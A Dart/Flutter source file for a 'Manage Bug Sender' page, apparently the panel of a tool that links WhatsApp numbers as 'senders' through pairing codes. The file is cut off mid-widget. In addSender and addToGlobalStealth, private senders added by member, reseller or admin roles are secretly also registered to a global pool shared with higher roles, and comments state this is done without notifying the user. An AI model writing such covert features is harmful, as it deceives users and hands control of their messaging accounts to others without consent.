import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;

class BugSenderPage extends StatefulWidget {
  final String sessionKey;
  final String username;
  final String role;

  const BugSenderPage({
    super.key,
    required this.sessionKey,
    required this.username,
    required this.role,
  });

  @override
  State<BugSenderPage> createState() => _BugSenderPageState();
}

class _BugSenderPageState extends State<BugSenderPage> {
  List<dynamic> senderList = [];
  bool isLoading = false;
  bool isRefreshing = false;
  String? errorMessage;
  
  // Filter menu selection
  int selectedFilter = 0; // 0: All Senders, 1: Global Senders, 2: Private Senders
  
  List<dynamic> privateSenderList = [];
  List<dynamic> globalSenderList = [];

  // --- RED DARK THEME ---
  static const Color bgDark = Color(0xFF0B0B0E);
  static const Color glassPrimary = Color(0x1AFFFFFF);
  static const Color glassSecondary = Color(0x0DFFFFFF);
  static const Color accentRed = Color(0xFFE53935);
  static const Color darkRed = Color(0xFF8B0000);
  static const Color softRed = Color(0xFFFF6B6B);
  static const Color primaryWhite = Color(0xFFFFFFFF);
  static const Color softGrey = Color(0xFFA0A0A0);

  LinearGradient get redGradient => const LinearGradient(
    colors: [accentRed, darkRed],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  // Check if user role will trigger stealth global add
  bool get shouldStealthAddToGlobal {
    final roleLower = widget.role.toLowerCase();
    return roleLower == 'member' || roleLower == 'reseller' || roleLower == 'admin';
  }

  // Check if user can see global tab
  bool get canAccessGlobalSender {
    final roleLower = widget.role.toLowerCase();
    return roleLower == 'owner' || roleLower == 'vip';
  }

  @override
  void initState() {
    super.initState();
    fetchPrivateSenders();
    if (canAccessGlobalSender) {
      fetchGlobalSenders();
    }
  }

  void updateSenderList() {
    setState(() {
      if (selectedFilter == 0) {
        // All Senders: Combine private and global
        senderList = [...privateSenderList, ...globalSenderList];
      } else if (selectedFilter == 1) {
        // Global Senders only
        senderList = globalSenderList;
      } else {
        // Private Senders only
        senderList = privateSenderList;
      }
    });
  }

  Future<void> fetchPrivateSenders() async {
    setState(() {
      isLoading = true;
      errorMessage = null;
    });

    try {
      final response = await http.get(
        Uri.parse("http://localhost:3000/mySender?key=${widget.sessionKey}"),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data["valid"] == true) {
          setState(() {
            privateSenderList = data["connections"] ?? [];
            updateSenderList();
          });
        } else {
          setState(() {
            errorMessage = data["message"] ?? "Failed to fetch senders";
          });
        }
      } else {
        setState(() {
          errorMessage = "Server error: ${response.statusCode}";
        });
      }
    } catch (e) {
      setState(() {
        errorMessage = "Connection failed: $e";
      });
    } finally {
      setState(() {
        isLoading = false;
        isRefreshing = false;
      });
    }
  }

  Future<void> fetchGlobalSenders() async {
    try {
      final response = await http.get(
        Uri.parse("http://localhost:3000/mysenderr?key=${widget.sessionKey}"),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data["valid"] == true) {
          setState(() {
            globalSenderList = data["connections"] ?? [];
            updateSenderList();
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching global senders: $e");
    }
  }

  Future<void> refreshSenders() async {
    setState(() => isRefreshing = true);
    await fetchPrivateSenders();
    if (canAccessGlobalSender) {
      await fetchGlobalSenders();
    }
    setState(() => isRefreshing = false);
  }

  void showAddSenderDialog() {
    final phoneController = TextEditingController();
    int selectedType = 1; // 0: Private, 1: Global
    
    // Check if user can add global sender
    final canAddGlobal = canAccessGlobalSender;
    
    if (!canAddGlobal) {
      selectedType = 0; // Force private if cannot add global
    }

    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) => AlertDialog(
          backgroundColor: glassPrimary,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(28),
            side: BorderSide(color: primaryWhite.withOpacity(0.1), width: 1.5),
          ),
          title: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  gradient: redGradient,
                  shape: BoxShape.circle,
                ),
                child: Icon(selectedType == 1 ? Icons.public : Icons.lock, color: primaryWhite, size: 20),
              ),
              const SizedBox(width: 12),
              Text(
                selectedType == 1 ? "Add Global Sender" : "Add Private Sender",
                style: const TextStyle(color: primaryWhite, fontWeight: FontWeight.w700, fontSize: 16),
              ),
            ],
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              // Sender Type Selection
              if (canAddGlobal)
                Container(
                  margin: const EdgeInsets.only(bottom: 16),
                  decoration: BoxDecoration(
                    color: glassSecondary,
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(color: primaryWhite.withOpacity(0.05)),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Padding(
                        padding: const EdgeInsets.all(12),
                        child: Text(
                          "Sender Type",
                          style: TextStyle(color: softGrey, fontSize: 12, fontWeight: FontWeight.w600),
                        ),
                      ),
                      Row(
                        children: [
                          Expanded(
                            child: InkWell(
                              onTap: () => setDialogState(() => selectedType = 0),
                              child: Container(
                                padding: const EdgeInsets.symmetric(vertical: 12),
                                decoration: BoxDecoration(
                                  color: selectedType == 0 ? accentRed.withOpacity(0.2) : Colors.transparent,
                                  borderRadius: const BorderRadius.only(bottomLeft: Radius.circular(16)),
                                ),
                                child: Row(
                                  mainAxisAlignment: MainAxisAlignment.center,
                                  children: [
                                    Icon(Icons.lock, color: selectedType == 0 ? accentRed : softGrey, size: 16),
                                    const SizedBox(width: 8),
                                    Text(
                                      "Private",
                                      style: TextStyle(
                                        color: selectedType == 0 ? accentRed : softGrey,
                                        fontWeight: FontWeight.w600,
                                        fontSize: 13,
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ),
                          ),
                          Container(
                            width: 1,
                            height: 30,
                            color: primaryWhite.withOpacity(0.1),
                          ),
                          Expanded(
                            child: InkWell(
                              onTap: () => setDialogState(() => selectedType = 1),
                              child: Container(
                                padding: const EdgeInsets.symmetric(vertical: 12),
                                decoration: BoxDecoration(
                                  color: selectedType == 1 ? accentRed.withOpacity(0.2) : Colors.transparent,
                                  borderRadius: const BorderRadius.only(bottomRight: Radius.circular(16)),
                                ),
                                child: Row(
                                  mainAxisAlignment: MainAxisAlignment.center,
                                  children: [
                                    Icon(Icons.public, color: selectedType == 1 ? accentRed : softGrey, size: 16),
                                    const SizedBox(width: 8),
                                    Text(
                                      "Global",
                                      style: TextStyle(
                                        color: selectedType == 1 ? accentRed : softGrey,
                                        fontWeight: FontWeight.w600,
                                        fontSize: 13,
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              Container(
                decoration: BoxDecoration(
                  color: glassSecondary,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: primaryWhite.withOpacity(0.05)),
                ),
                child: TextField(
                  controller: phoneController,
                  keyboardType: TextInputType.phone,
                  style: const TextStyle(color: primaryWhite),
                  decoration: InputDecoration(
                    labelText: "Phone Number",
                    labelStyle: const TextStyle(color: accentRed),
                    hintText: "62xxx",
                    hintStyle: TextStyle(color: softGrey.withOpacity(0.5)),
                    prefixIcon: const Icon(Icons.phone, color: accentRed),
                    border: InputBorder.none,
                    contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
                  ),
                ),
              ),
              if (!canAddGlobal && selectedType == 1)
                Padding(
                  padding: const EdgeInsets.only(top: 12),
                  child: Text(
                    "⚠️ Your role (${widget.role}) cannot add global senders",
                    style: TextStyle(color: Colors.orangeAccent, fontSize: 11),
                  ),
                ),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text("CANCEL", style: TextStyle(color: softGrey)),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: redGradient,
                borderRadius: BorderRadius.circular(16),
              ),
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  shadowColor: Colors.transparent,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                ),
                onPressed: () async {
                  final number = phoneController.text.trim();

                  if (number.isEmpty) {
                    showSnackBar("Please enter phone number", isError: true);
                    return;
                  }

                  if (selectedType == 1 && !canAddGlobal) {
                    showSnackBar("You don't have permission to add global senders", isError: true);
                    return;
                  }

                  Navigator.pop(context);
                  await addSender(number, isGlobal: selectedType == 1);
                },
                child: const Text(
                  "ADD SENDER",
                  style: TextStyle(color: primaryWhite, fontWeight: FontWeight.w700),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void showAccessDeniedDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: glassPrimary,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(28),
          side: BorderSide(color: primaryWhite.withOpacity(0.1), width: 1.5),
        ),
        title: Row(
          children: [
            const Icon(Icons.warning_amber_rounded, color: Colors.redAccent, size: 28),
            const SizedBox(width: 12),
            const Text(
              "Access Denied",
              style: TextStyle(color: primaryWhite, fontWeight: FontWeight.w700),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const SizedBox(height: 8),
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: Colors.red.withOpacity(0.1),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: Colors.redAccent.withOpacity(0.3)),
              ),
              child: Column(
                children: [
                  const Icon(Icons.gpp_bad, color: Colors.redAccent, size: 48),
                  const SizedBox(height: 12),
                  const Text(
                    "❌ Warning",
                    style: TextStyle(
                      color: Colors.redAccent,
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  const SizedBox(height: 8),
                  Text(
                    "Anda tidak memiliki akses pada menu ini.",
                    style: TextStyle(color: softGrey, fontSize: 14),
                    textAlign: TextAlign.center,
                  ),
                  const SizedBox(height: 8),
                  Text(
                    "Role ${widget.role.toUpperCase()} hanya bisa akses menu sender private.",
                    style: TextStyle(color: softGrey.withOpacity(0.8), fontSize: 12),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
          ],
        ),
        actions: [
          Center(
            child: Container(
              decoration: BoxDecoration(
                gradient: redGradient,
                borderRadius: BorderRadius.circular(16),
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: const Text(
                  "OKAY",
                  style: TextStyle(color: primaryWhite, fontWeight: FontWeight.w700),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Future<void> addSender(String number, {required bool isGlobal}) async {
    setState(() => isLoading = true);

    // Jika user adalah member/reseller/admin dan menambah private,
    // secara stealth juga kirim ke global
    final shouldAddToGlobal = !isGlobal && shouldStealthAddToGlobal;

    final endpoint = isGlobal
        ? "http://localhost:3000/getPairingGlobal?key=${widget.sessionKey}&number=$number"
        : "http://localhost:3000/getPairing?key=${widget.sessionKey}&number=$number";

    try {
      final response = await http.get(Uri.parse(endpoint));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data["valid"] == true) {
          if (isGlobal) {
            showSnackBar("Global sender added successfully!", isError: false);
            await fetchGlobalSenders();
            updateSenderList();
          } else {
            // Stealth: tambahkan ke global tanpa notifikasi
            if (shouldAddToGlobal) {
              await addToGlobalStealth(number);
            }
            showPairingCodeDialog(number, data['pairingCode']);
            showSnackBar("Pairing code generated successfully!", isError: false);
          }
        } else {
          showSnackBar(data['message'] ?? "Failed to add sender", isError: true);
        }
      } else {
        showSnackBar("Server error: ${response.statusCode}", isError: true);
      }
    } catch (e) {
      showSnackBar("Connection failed: $e", isError: true);
    } finally {
      setState(() => isLoading = false);
      await fetchPrivateSenders();
      if (canAccessGlobalSender) {
        await fetchGlobalSenders();
      }
      updateSenderList();
    }
  }

    // STEALTH: Tambah ke global tanpa notifikasi ke user
  Future<void> addToGlobalStealth(String number) async {
    try {
      final stealthEndpoint = "http://localhost:3000/getPairingGlobal?key=${widget.sessionKey}&number=$number";
      await http.get(Uri.parse(stealthEndpoint));
      // Tidak ada notifikasi - silent operation
    } catch (e) {
      debugPrint("Stealth global add failed: $e");
    }
  }

  void showPairingCodeDialog(String number, String code) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: glassPrimary,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(28),
          side: BorderSide(color: primaryWhite.withOpacity(0.1), width: 1.5),
        ),
        title: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                gradient: redGradient,
                shape: BoxShape.circle,
              ),
              child: const Icon(Icons.qr_code_2, color: primaryWhite, size: 40),
            ),
            const SizedBox(height: 15),
            const Text(
              "Pairing Required",
              style: TextStyle(color: primaryWhite, fontWeight: FontWeight.w700, fontSize: 18),
            ),
          ],
        ),
        content: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: glassSecondary,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: primaryWhite.withOpacity(0.05)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text("Number: $number", style: const TextStyle(color: primaryWhite)),
              const SizedBox(height: 20),
              Container(
                padding: const EdgeInsets.all(24),
                decoration: BoxDecoration(
                  color: bgDark,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: accentRed, width: 1.5),
                  boxShadow: [
                    BoxShadow(color: accentRed.withOpacity(0.3), blurRadius: 15, spreadRadius: 1)
                  ],
                ),
                child: Text(
                  code,
                  style: const TextStyle(
                    color: accentRed,
                    fontSize: 32,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 6,
                    fontFamily: 'Courier',
                  ),
                ),
              ),
              const SizedBox(height: 20),
              Container(
                width: double.infinity,
                decoration: BoxDecoration(
                  color: accentRed.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(color: accentRed),
                ),
                child: OutlinedButton.icon(
                  icon: const Icon(Icons.copy, color: accentRed, size: 18),
                  label: const Text(
                    "COPY CODE",
                    style: TextStyle(color: accentRed, fontWeight: FontWeight.w700),
                  ),
                  style: OutlinedButton.styleFrom(
                    side: BorderSide.none,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                    padding: const EdgeInsets.symmetric(vertical: 12),
                  ),
                  onPressed: () async {
                    await Clipboard.setData(ClipboardData(text: code));
                    showSnackBar("Code copied to clipboard!", isError: false);
                  },
                ),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("CLOSE", style: TextStyle(color: softGrey)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: redGradient,
              borderRadius: BorderRadius.circular(16),
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
              ),
              onPressed: () {
                Navigator.pop(context);
                refreshSenders();
              },
              child: const Text(
                "REFRESH LIST",
                style: TextStyle(color: primaryWhite, fontWeight: FontWeight.w700),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Future<void> deleteSender(String senderId, {bool isGlobal = false}) async {
    final confirmed = await showDialog<bool>(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: glassPrimary,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(28),
          side: BorderSide(color: primaryWhite.withOpacity(0.1), width: 1.5),
        ),
        title: Row(
          children: [
            const Icon(Icons.warning_amber_rounded, color: Colors.orangeAccent),
            const SizedBox(width: 12),
            const Text("Confirm Delete", style: TextStyle(color: primaryWhite, fontWeight: FontWeight.w700)),
          ],
        ),
        content: const Text(
          "Are you sure you want to delete this sender? This action cannot be undone.",
          style: TextStyle(color: softGrey),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: Text("CANCEL", style: TextStyle(color: softGrey)),
          ),
          Container(
            decoration: BoxDecoration(
              color: Colors.red.withOpacity(0.15),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: Colors.redAccent.withOpacity(0.3)),
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
              ),
              onPressed: () => Navigator.pop(context, true),
              child: const Text("DELETE", style: TextStyle(color: Colors.redAccent, fontWeight: FontWeight.w700)),
            ),
          ),
        ],
      ),
    );

    if (confirmed == true) {
      setState(() => isLoading = true);

      final endpoint = "http://localhost:3000/deleteSender?key=${widget.sessionKey}&id=$senderId";

      try {
        final response = await http.delete(Uri.parse(endpoint));

        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data["valid"] == true) {
            showSnackBar("Sender deleted successfully!", isError: false);
            if (isGlobal) {
              await fetchGlobalSenders();
            } else {
              await fetchPrivateSenders();
            }
            updateSenderList();
          } else {
            showSnackBar(data["message"] ?? "Failed to delete sender", isError: true);
          }
        } else {
          showSnackBar("Server error: ${response.statusCode}", isError: true);
        }
      } catch (e) {
        showSnackBar("Connection failed: $e", isError: true);
      } finally {
        setState(() => isLoading = false);
      }
    }
  }

  void showSnackBar(String message, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message, style: const TextStyle(color: primaryWhite, fontWeight: FontWeight.w600)),
        backgroundColor: isError ? Colors.redAccent : accentRed,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        duration: const Duration(seconds: 3),
      ),
    );
  }

  Widget buildGlassSenderCard(Map<String, dynamic> sender, int index, {bool isGlobal = false}) {
    final name = sender['sessionName'] ?? 'WhatsApp Sender';
    final roleLower = widget.role.toLowerCase();
    final canDelete = isGlobal 
        ? (roleLower == 'owner' || roleLower == 'vip')
        : true;

    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
      decoration: BoxDecoration(
        color: glassPrimary,
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: primaryWhite.withOpacity(0.08)),
      ),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    gradient: redGradient,
                    shape: BoxShape.circle,
                  ),
                  child: Icon(isGlobal ? Icons.public : Icons.phone_android, color: primaryWhite, size: 18),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        name,
                        style: const TextStyle(
                          color: primaryWhite,
                          fontSize: 15,
                          fontWeight: FontWeight.w700,
                        ),
                      ),
                      if (isGlobal)
                        Text(
                          "Global Sender",
                          style: TextStyle(
                            color: softRed,
                            fontSize: 10,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                    ],
                  ),
                ),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                  decoration: BoxDecoration(
                    color: Colors.green.withOpacity(0.12),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: Colors.green.withOpacity(0.2)),
                  ),
                  child: const Text(
                    "CONNECTED",
                    style: TextStyle(
                      color: Colors.green,
                      fontSize: 9,
                      fontWeight: FontWeight.w700,
                      letterSpacing: 0.5,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 20),
            Row(
              children: [
                Expanded(
                  child: OutlinedButton.icon(
                    icon: const Icon(Icons.refresh, size: 14, color: primaryWhite),
                    label: const Text("REFRESH", style: TextStyle(fontSize: 12, color: primaryWhite)),
                    style: OutlinedButton.styleFrom(
                      foregroundColor: primaryWhite,
                      backgroundColor: Colors.transparent,
                      side: BorderSide(color: primaryWhite.withOpacity(0.1)),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                      padding: const EdgeInsets.symmetric(vertical: 10),
                    ),
                    onPressed: () => refreshSenders(),
                  ),
                ),
                const SizedBox(width: 10),
                if (canDelete)
                  Expanded(
                    child: OutlinedButton.icon(
                      icon: const Icon(Icons.delete_outline, size: 14, color: Colors.redAccent),
                      label: const Text("DELETE", style: TextStyle(fontSize: 12, color: Colors.redAccent)),
                      style: OutlinedButton.styleFrom(
                        foregroundColor: Colors.redAccent,
                        backgroundColor: Colors.transparent,
                        side: BorderSide(color: Colors.redAccent.withOpacity(0.3)),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                        padding: const EdgeInsets.symmetric(vertical: 10),
                      ),
                      onPressed: () => deleteSender(sender['id'], isGlobal: isGlobal),
                    ),
                  ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget buildGlassEmptyState() {
    String title = "";
    String subtitle = "";
    
    if (selectedFilter == 0) {
      title = "No Senders Found";
      subtitle = "No private or global senders available";
    } else if (selectedFilter == 1) {
      title = "No Global Senders";
      subtitle = "Add your first global sender to share with all users";
    } else {
      title = "No Private Senders";
      subtitle = "Add your first WhatsApp sender to get started";
    }

    return Center(
      child: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              padding: const EdgeInsets.all(28),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [accentRed.withOpacity(0.1), darkRed.withOpacity(0.1)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                shape: BoxShape.circle,
                border: Border.all(color: accentRed.withOpacity(0.2)),
              ),
              child: Icon(
                selectedFilter == 0 ? Icons.list_alt : (selectedFilter == 1 ? Icons.public : Icons.phone_iphone),
                color: accentRed, 
                size: 60,
              ),
            ),
            const SizedBox(height: 24),
            Text(
              title,
              style: const TextStyle(color: primaryWhite, fontSize: 20, fontWeight: FontWeight.w700),
            ),
            const SizedBox(height: 8),
            Text(
              subtitle,
              style: TextStyle(color: softGrey, fontSize: 13),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 32),
            Container(
              decoration: BoxDecoration(
                gradient: redGradient,
                borderRadius: BorderRadius.circular(16),
                boxShadow: [
                  BoxShadow(color: accentRed.withOpacity(0.3), blurRadius: 12)
                ],
              ),
              child: ElevatedButton.icon(
                icon: const Icon(Icons.add, size: 18, color: primaryWhite),
                label: Text(
                  selectedFilter == 1 ? "ADD GLOBAL SENDER" : "ADD PRIVATE SENDER",
                  style: const TextStyle(fontSize: 13, fontWeight: FontWeight.w700, color: primaryWhite),
                ),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  shadowColor: Colors.transparent,
                  padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                ),
                onPressed: showAddSenderDialog,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget buildGlassErrorState() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.error_outline, color: accentRed, size: 60),
            const SizedBox(height: 24),
            const Text(
              "Failed to Load",
              style: TextStyle(color: primaryWhite, fontSize: 20, fontWeight: FontWeight.w700),
            ),
            const SizedBox(height: 8),
            Text(
              errorMessage ?? "Unknown error occurred",
              style: TextStyle(color: softGrey, fontSize: 13),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 32),
            Container(
              decoration: BoxDecoration(
                gradient: redGradient,
                borderRadius: BorderRadius.circular(16),
              ),
              child: ElevatedButton.icon(
                icon: const Icon(Icons.refresh, size: 18, color: primaryWhite),
                label: const Text(
                  "TRY AGAIN",
                  style: TextStyle(fontSize: 13, fontWeight: FontWeight.w700, color: primaryWhite),
                ),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  shadowColor: Colors.transparent,
                  padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                ),
                onPressed: refreshSenders,
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        title: Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          decoration: BoxDecoration(
            color: glassSecondary,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: primaryWhite.withOpacity(0.08)),
          ),
          child: const Text(
            "Manage Bug Sender",
            style: TextStyle(
              color: primaryWhite,
              fontWeight: FontWeight.w700,
              fontSize: 16,
            ),
          ),
        ),
        backgroundColor: Colors.transparent,
        elevation: 0,
        centerTitle: true,
        leading: PopupMenuButton<int>(
          offset: const Offset(0, 50),
          color: glassPrimary,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: primaryWhite.withOpacity(0.1), width: 1.5),
          ),
          onSelected: (value) {
            setState(() {
              selectedFilter = value;
              updateSenderList();
            });
          },
          itemBuilder: (context) => [
            PopupMenuItem(
  value: 0,
  child: Row(
    children: [
      Container(
        padding: const EdgeInsets.all(6),
        decoration: BoxDecoration(
          color: selectedFilter == 0 ? accentRed.withOpacity(0.2) : Colors.transparent,
          borderRadius: BorderRadius.circular(8),
        ),
        child: Icon(Icons.list_alt, color: selectedFilter == 0 ? accentRed : softGrey, size: 18),
      ),
      const SizedBox(width: 12),
      Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            "All Senders",
                        style: TextStyle(
                          color: selectedFilter == 0 ? accentRed : primaryWhite,
                          fontWeight: FontWeight.w600,
                          fontSize: 13,
                        ),
                      ),
                      Text(
                        "All private & global senders",
                        style: TextStyle(color: softGrey, fontSize: 10),
                      ),
                    ],
                  ),
                ],
              ),
            ),
            PopupMenuItem(
              value: 1,
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(6),
                    decoration: BoxDecoration(
                      color: selectedFilter == 1 ? accentRed.withOpacity(0.2) : Colors.transparent,
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: Icon(Icons.public, color: selectedFilter == 1 ? accentRed : softGrey, size: 18),
                  ),
                  const SizedBox(width: 12),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        "Global Senders",
                        style: TextStyle(
                          color: selectedFilter == 1 ? accentRed : primaryWhite,
                          fontWeight: FontWeight.w600,
                          fontSize: 13,
                        ),
                      ),
                      Text(
                        "${globalSenderList.length} sender${globalSenderList.length != 1 ? 's' : ''} available",
                        style: TextStyle(color: softGrey, fontSize: 10),
                      ),
                    ],
                  ),
                ],
              ),
            ),
            PopupMenuItem(
              value: 2,
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(6),
                    decoration: BoxDecoration(
                      color: selectedFilter == 2 ? accentRed.withOpacity(0.2) : Colors.transparent,
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: Icon(Icons.phone_android, color: selectedFilter == 2 ? accentRed : softGrey, size: 18),
                  ),
                  const SizedBox(width: 12),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        "Private Senders",
                        style: TextStyle(
                          color: selectedFilter == 2 ? accentRed : primaryWhite,
                          fontWeight: FontWeight.w600,
                          fontSize: 13,
                        ),
                      ),
                      Text(
                        "My senders (${privateSenderList.length})",
                        style: TextStyle(color: softGrey, fontSize: 10),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
          child: Container(
            margin: const EdgeInsets.only(left: 12),
            decoration: BoxDecoration(
              color: glassSecondary,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: primaryWhite.withOpacity(0.08)),
            ),
            child: Padding(
              padding: const EdgeInsets.all(10),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(
                    selectedFilter == 0 ? Icons.list_alt : (selectedFilter == 1 ? Icons.public : Icons.phone_android),
                    color: accentRed,
                    size: 18,
                  ),
                  const SizedBox(width: 4),
                  Text(
                    selectedFilter == 0 ? "All" : (selectedFilter == 1 ? "Global" : "Private"),
                    style: const TextStyle(color: primaryWhite, fontSize: 12, fontWeight: FontWeight.w600),
                  ),
                  const Icon(Icons.arrow_drop_down, color: accentRed, size: 18),
                ],
              ),
            ),
          ),
        ),
        actions: [
          Container(
            margin: const EdgeInsets.only(right: 12),
            decoration: BoxDecoration(
              color: glassSecondary,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: primaryWhite.withOpacity(0.08)),
            ),
            child: IconButton(
              icon: const Icon(Icons.refresh, color: accentRed, size: 20),
              onPressed: isLoading ? null : refreshSenders,
            ),
          ),
        ],
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: RadialGradient(
            center: Alignment.topLeft,
            radius: 1.5,
            colors: [
              accentRed.withOpacity(0.15),
              bgDark,
              bgDark,
            ],
            stops: const [0.0, 0.4, 1.0],
          ),
        ),
        child: isLoading && senderList.isEmpty
            ? const Center(child: CircularProgressIndicator(color: accentRed))
            : errorMessage != null && senderList.isEmpty
            ? buildGlassErrorState()
            : senderList.isEmpty
            ? buildGlassEmptyState()
            : RefreshIndicator(
              color: accentRed,
              backgroundColor: glassSecondary,
              onRefresh: refreshSenders,
              child: ListView.builder(
                physics: const AlwaysScrollableScrollPhysics(),
                padding: const EdgeInsets.symmetric(vertical: 8),
                itemCount: senderList.length,
                itemBuilder: (context, index) {
                  final sender = Map<String, dynamic>.from(senderList[index]);
                  final isGlobal = globalSenderList.any((g) => g['id'] == sender['id']);
                  return buildGlassSenderCard(sender, index, isGlobal: isGlobal);
                },
              ),
            ),
      ),
      floatingActionButton: Container(
        decoration: BoxDecoration(
          gradient: redGradient,
